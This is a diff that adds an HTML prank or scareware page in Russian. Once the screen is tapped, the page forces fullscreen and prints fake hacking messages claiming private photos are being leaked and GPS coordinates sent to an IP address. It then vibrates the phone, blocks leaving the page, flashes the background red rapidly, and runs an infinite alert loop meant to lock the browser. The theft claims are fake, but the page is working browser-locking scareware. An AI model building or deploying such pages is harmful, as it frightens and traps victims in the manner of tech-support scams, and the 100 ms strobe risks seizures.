@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>S.Y.S.T.E.M. ERROR</title>
+    <style>
+        body { background: black; color: #00ff00; font-family: monospace; overflow: hidden; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; touch-action: none; }
+        #console { width: 90%; border: 1px solid #00ff00; padding: 15px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 20px #00ff00; z-index: 10; }
+        .red { color: red; font-weight: bold; text-shadow: 0 0 5px red; }
+    </style>
+</head>
+<body onclick="startHacking()">
+
+    <div id="console">
+        <h1 id="status">СИСТЕМА ПЕРЕГРУЖЕНА</h1>
+        <p id="hint">Нажми на экран для диагностики...</p>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        // Блокировка выхода (на всякий случай)
+        window.onbeforeunload = function() { return "КРИТИЧЕСКАЯ ОШИБКА!"; };
+
+        function startHacking() {
+            // Входим в полный экран (скрываем интерфейс Хрома)
+            let elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen();
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+
+            const log = document.getElementById('log');
+            const status = document.getElementById('status');
+            const hint = document.getElementById('hint');
+            
+            hint.style.display = 'none';
+            status.innerText = "CRITICAL BREACH DETECTED";
+            status.className = "red";
+
+            const phrases = [
+                "> Инициализация взлома...",
+                "> Поиск уязвимостей в Telegram...",
+                "> [!] ОБНАРУЖЕНО: 142 личных фото",
+                "> Начинаю выгрузку в DarkNet...",
+                "> Отправка GPS координат на сервер 77.81.45.35..",
+                "> ТЕЛЕФОН ЗАБЛОКИРОВАН. ПРИВЕТ ОТ BLACK HAT, ОСЕЛ!"
+            ];
+
+            let i = 0;
+            const interval = setInterval(() => {
+                if (i < phrases.length) {
+                    const line = document.createElement('p');
+                    line.innerHTML = phrases[i];
+                    if (phrases[i].includes("[!]")) line.className = "red";
+                    log.appendChild(line);
+                    
+                    // Жесткая вибрация
+                    if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                    
+                    i++;
+                } else {
+                    clearInterval(interval);
+                    startChaos();
+                }
+            }, 800);
+        }
+
+        function startChaos() {
+            // Запускаем мигание фона
+            setInterval(() => {
+                document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
+            }, 100);
+
+            // Тот самый бесконечный алерт, который Хром не доджит
+            setTimeout(() => {
+                while(true) {
+                    alert("КРИТИЧЕСКАЯ ОШИБКА СИСТЕМЫ! ПАМЯТЬ ПОВРЕЖДЕНА.");
+                }
+            }, 500);
+        }
+    </script>
+</body>
+  </html>
